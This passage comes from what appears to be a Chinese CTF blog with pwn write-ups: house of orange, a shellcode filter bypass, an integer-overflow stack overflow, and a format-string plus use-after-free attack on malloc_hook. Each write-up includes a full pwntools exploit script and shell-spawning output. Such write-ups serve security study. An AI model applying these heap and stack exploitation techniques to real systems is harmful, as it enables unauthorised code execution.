class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = process([<span class="string">"/home/winter/hoo/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/home/winter/hoo/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"turned on(0 ~ 5):"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"wind turbine: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Your name:"</span>)</span><br><span class="line">    p.send(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">" viewed: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"turbine:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Please input: "</span>)</span><br><span class="line">    p.send(str(content))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'winter'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x90</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0xf61</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1000</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x400</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)<span class="number">-0x39C161</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x11</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x61</span></span><br><span class="line">log.success(<span class="string">"heap_base:"</span>+hex(heapbase))</span><br><span class="line"></span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x400</span></span><br><span class="line">fake_file = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(heapbase + <span class="number">0x588</span>)</span><br><span class="line"><span class="comment">#0x555555f774b0 + 0xd8 - heap_base</span></span><br><span class="line">payload += p64(system) * <span class="number">8</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"turned on(0 ~ 5):"</span>)</span><br><span class="line">p.sendline(str(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">"wind turbine: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x90</span>))</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x56 bytes:</span><br><span class="line">    &quot;*** Error in &#96;.&#x2F;wind_farm_panel&#39;: malloc(): memory corruption: 0x00007f49da1f5520 ***\n&quot;</span><br><span class="line">*** Error in &#96;.&#x2F;wind_farm_panel&#39;: malloc(): memory corruption: 0x00007f49da1f5520 ***</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &#39;ls\n&#39;</span><br><span class="line">[DEBUG] Received 0x38 bytes:</span><br><span class="line">    &#39;core  ld-2.23.so  libc-2.23.so\twind.py  wind_farm_panel\n&#39;</span><br><span class="line">core  ld-2.23.so  libc-2.23.so    wind.py  wind_farm_panel</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h3 id="参考-amp-下载-1"><a href="#参考-amp-下载-1" class="headerlink" title="参考 &amp; 下载"></a>参考 &amp; 下载</h3><table>
<thead>
<tr>
<th>附件</th>
<th>libc</th>
<th>ld</th>
</tr>
</thead>
<tbody><tr>
<td><a href="wind_farm_panel">点击下载</a></td>
<td><a href="libc-2.23.so">点击下载</a></td>
<td><a href="ld-2.23.so">点击下载</a></td>
</tr>
</tbody></table>
<ol>
<li><a href="https://www.giantbranch.cn/2018/12/29/CTF%20PWN%E4%B9%8Bhouse%20of%20orange/" target="_blank" rel="noopener">https://www.giantbranch.cn/2018/12/29/CTF%20PWN%E4%B9%8Bhouse%20of%20orange/</a></li>
<li><a href="https://b0ldfrev.top/2018/11/06/House-of-orange/#FSOP" target="_blank" rel="noopener">https://b0ldfrev.top/2018/11/06/House-of-orange/#FSOP</a></li>
<li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/28/orange/" target="_blank" rel="noopener">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/28/orange/</a></li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>house of orange的步骤：</p>
<ol>
<li><p>栈溢出，修改top chunk的大小。一般保留后三位就行。</p>
</li>
<li><p>top chunk放入了unsortbin</p>
</li>
<li><p>申请一个small bin or large bin（会从unsortbin中切）</p>
</li>
<li><p>泄漏libc（申请回来的第一行数据）</p>
</li>
<li><p>泄漏堆地址（申请回来的第二行数据）</p>
</li>
<li><p>unsortbin attack </p>
<ol>
<li><p>“/bin/sh\x00” + p64(0x61)  =&gt; binsh是作为fp的第一参数，0x61是因为_chains刚好在这儿,</p>
</li>
<li><p>fd随便，bk填<code>libc.symbols[&#39;_IO_list_all&#39;]-0x10</code></p>
</li>
<li><p>接着是_IO_write_base和IO_write_ptr &gt; fp，需要让fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base，故分别填0、1即可</p>
</li>
<li><p>因为vtable的偏移是0xd8，所以都填上0即可（mode需要为0）</p>
</li>
<li><p>在vtable上填上假的构造的即可，这里是system的函数地址</p>
</li>
<li><p>最后修改即可。</p>
</li>
</ol>
</li>
</ol>

	
	</div>
  <a type="button" href="/2021/05/13/house-of-orange/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/08/buu每日一题（4）/" >buu每日一题（4）</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-08  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a>starctf_2019_babyshell</h2><blockquote>
<p>tql，shellcode的题新花样</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
<p>mmap开辟空间，输入shellcode，然后绕过检查即可执行shellcode</p>
</blockquote>
<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506205132913.png" alt="image-20210506205132913"></p>
<blockquote>
<p>要绕过检查，令第一个字符为空即可。</p>
</blockquote>
<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506205233682.png" alt="image-20210506205233682"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>为了让shellcode正常执行，需要构造一条合法以\x00开头的语句。</p>
<p><code>\x00b\x00</code>、<code>\x00b\x22</code>都是合法语句。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#\x00b\x00</span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f77a00c1000</span><br><span class="line">0x7f77a00c1000:	0x2fb848686a006200&lt;&#x3D;	0x50732f2f2f6e6962</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30i 0x7f77a00c1000</span><br><span class="line">   0x7f77a00c1000:	add    BYTE PTR [rdx+0x0],ah</span><br><span class="line">   0x7f77a00c1003:	push   0x68</span><br><span class="line">#三个字节组成一个语句</span><br><span class="line"></span><br><span class="line">#同理</span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x7fb05ae4b000</span><br><span class="line">0x7fb05ae4b000:	0x2fb848686a226200	0x50732f2f2f6e6962</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30i 0x7fb05ae4b000</span><br><span class="line">   0x7fb05ae4b000:	add    BYTE PTR [rdx+0x22],ah</span><br><span class="line">   0x7fb05ae4b003:	push   0x68</span><br></pre></td></tr></table></figure>

<p>所以，只要在shellcode之前加入’\x00b\x00’即可绕过检查，并正常执行shellcode</p>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./starctf_2019_babyshell"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",27975)</span></span><br><span class="line">context.log_level =<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00b\x22'</span>+asm(shellcraft.sh())</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="wustctf2020-name-your-cat"><a href="#wustctf2020-name-your-cat" class="headerlink" title="wustctf2020_name_your_cat"></a>wustctf2020_name_your_cat</h2><blockquote>
<p>简单的栈题，覆盖返回地址为后门函数即可。</p>
<p>但是不知道为什么，，发送数据为一个地址的话，会导致程序崩溃（无法正常进行下一次的循环），所以要把发送后门地址放在最后一个。</p>
</blockquote>
<p>程序流程：</p>
<ol>
<li>for循环五次</li>
<li>输入一个数字</li>
<li>往8*v+base的地方发送7个字符的数据</li>
</ol>
<p>但是程序没有检查输入的数字大小，而base位于<code>[ebp-34h]</code>的地址，所以在0x34+4的位置存储的就是返回地址，也就是数字7（0x38/8=7），发送后门函数的地址即可。</p>
<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./wustctf2020_name_your_cat"</span>)</span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn",26079)</span></span><br><span class="line">elf = ELF(<span class="string">"./wustctf2020_name_your_cat"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">shell = <span class="number">0x080485CB</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"which"</span>)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line">	p.recvuntil(<span class="string">"Give your name plz: "</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	add(<span class="number">1</span>,p64(shell))</span><br><span class="line">add(<span class="number">7</span>,p64(shell))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="gyctf-2020-some-thing-interesting"><a href="#gyctf-2020-some-thing-interesting" class="headerlink" title="gyctf_2020_some_thing_interesting"></a>gyctf_2020_some_thing_interesting</h2><blockquote>
<p>printf+uaf</p>
<p>一开始没看到格式化字符串，，，TAT</p>
<p>emm，格式化字符串，泄露%3$p的位置，，，和远程貌似有点不对。。。。<del>知道泄露栈上数据，但是太前面了，gdb都没找到，可以尽量在10附近左右看看</del></p>
</blockquote>
<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>格式化字符串部分</p>
<blockquote>
<p>可以输入19个字节，只需要前14个字节可以匹配成功即可。</p>
</blockquote>
</li>
</ol>
<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507220553456.png" alt="image-20210507220553456"></p>
<blockquote>
<p>前面输入的字符串，存在格式化字符串，有5个字节可以利用，可以用来泄露libc地址</p>
</blockquote>
<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507220712091.png" alt="image-20210507220712091"></p>
<ol start="2">
<li>正常堆体<ol>
<li>add功能：创建0~0x70大小的块</li>
<li>修改：没有溢出</li>
<li>释放：uaf，其实可以直接修改uaf，不用double free</li>
<li>打印</li>
</ol>
</li>
</ol>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li>根据格式化字符串，泄露libc地址</li>
<li>根据uaf，申请块到mallochook</li>
<li>覆盖malloc_hook为gadget即可</li>
</ol>
<h3 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process("./gyctf_2020_some_thing_interesting")</span></span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn",27779)</span></span><br><span class="line"><span class="comment"># p = process(["./gyctf_2020_some_thing_interesting"],</span></span><br><span class="line">            <span class="comment"># env=&#123;"LD_PRELOAD":"./libc-2.23.so"&#125;)</span></span><br><span class="line">p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./gyctf_2020_some_thing_interesting"</span>],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">"./gyctf_2020_some_thing_interesting"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.23.so")</span></span><br><span class="line">libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Input your code please:"</span>)</span><br><span class="line">	<span class="comment"># p.sendline("OreOOrereOOreO%3$p")</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	p.sendline(<span class="string">"OreOOrereOOreO%13$p"</span>)</span><br><span class="line">init()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"want to do :"</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">	cmd(<span class="number">0</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"OreOOrereOOreO0x"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(o_size,o_content,re_size,re_content)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; O's length : "</span>)</span><br><span class="line">	p.sendline(str(o_size))</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; O : "</span>)</span><br><span class="line">	p.sendline(o_content)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; RE's length : "</span>)</span><br><span class="line">	p.sendline(str(re_size))</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; RE : "</span>)</span><br><span class="line">	p.sendline(re_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(oid,o_content,re_content)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)	</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Oreo ID : "</span>)</span><br><span class="line">	p.sendline(str(oid))</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; O : "</span>)</span><br><span class="line">	p.sendline(o_content)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; RE : "</span>)</span><br><span class="line">	p.sendline(re_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(oid)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)	</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Oreo ID : "</span>)</span><br><span class="line">	p.sendline(str(oid))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(oid)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Oreo ID : "</span>)</span><br><span class="line">	p.sendline(str(oid))</span><br><span class="line"></span><br><span class="line">check()</span><br><span class="line">xie = int(p.recv(<span class="number">12</span>).strip(),<span class="number">16</span>)- <span class="number">0xf0</span></span><br><span class="line">libc_base = xie -libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">log.success(hex(xie))</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"aaaa"</span>,<span class="number">0x20</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"aaaa"</span>,<span class="number">0x20</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># edit(1,'a',p64(fake_chunk))</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(fake_chunk),<span class="number">0x68</span>,p64(fake_chunk))</span><br><span class="line"></span><br><span class="line"><span class="comment"># onegadget = [0x3f3f6,0x3f44a,0xd5c17]</span></span><br><span class="line">onegadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"a"</span>,<span class="number">0x68</span>,<span class="string">'b'</span>*<span class="number">0x13</span>+p64(onegadget[<span class="number">3</span>]+libc_base))</span><br><span class="line"><span class="comment"># log.success(hex(onegadget[0]+libc_base))</span></span><br><span class="line"><span class="comment"># p.recvuntil("#######################\n")</span></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt; O's length : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x20</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>本题首先需要细心，能发现格式化字符串，其次，格式化的话，需要找到栈上，在比较后面，stack 30第一个也是%12$p</p>
</blockquote>

	
	</div>
  <a type="button" href="/2021/05/08/buu每日一题（4）/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/08/buu每日一题（2）/" >buu每日一题（2）</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-08  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><blockquote>
<p>简单的，首先通过整数溢出绕过检查，然后栈溢出，存在后门函数，直接执行即可</p>
</blockquote>
<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%882%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506201527291.png" alt="image-20210506201527291"></p>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./bjdctf_2020_babystack2"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28526</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x000400726</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">-1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2021/05/08/buu每日一题（2）/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/06/ciscn-2019-es-7/" >ciscn_2019_es_7</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-06  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>其实做过一次<a href="https://warm-winter.github.io/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/#12-ciscn-2019-s-3" target="_blank" rel="noopener">第一次wp</a>，，，但是再做还是不太可，重新写一篇【两篇侧重点不一样】</p>
</blockquote>
<h3 id="题目流程"><a href="#题目流程" class="headerlink" title="题目流程"></a>题目流程</h3><blockquote>
<p>两个函数，read和write</p>
</blockquote>
<p><img src="/2021/05/06/ciscn-2019-es-7/image-20210506185234819.png" alt="image-20210506185234819"></p>
<blockquote>
<p>输入和打印的是同一个地址，rsp+buf，buf的长度为0x10。</p>
<p>所以栈溢出的偏移为0x10，再下一个地址是rsp，ret的时候，pop eip会取过来。</p>
</blockquote>
<p><img src="/2021/05/06/ciscn-2019-es-7/image-20210506185325681.png" alt="image-20210506185325681"></p>
<blockquote>
<p>程序给了两个后门函数</p>
<p>第一个是rax，设置0xf，可以进行srop</p>
<p>第二个设置为execve的调用号，设置参数为“/bin/sh”、0、0（必须设置，因为vuln函数中rdi，rsi和rdx都有值）即可get shell</p>
</blockquote>
<p><img src="/2021/05/06/ciscn-2019-es-7/image-20210506185517298.png" alt="image-20210506185517298"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>综上，有两种方法可以进行漏洞利用</p>
<ol>
<li>利用gadget2，需要设置三个寄存器参数，可以通过ret2csu来设置</li>
<li>利用gadget1，srop来get shell</li>
</ol>
<blockquote>
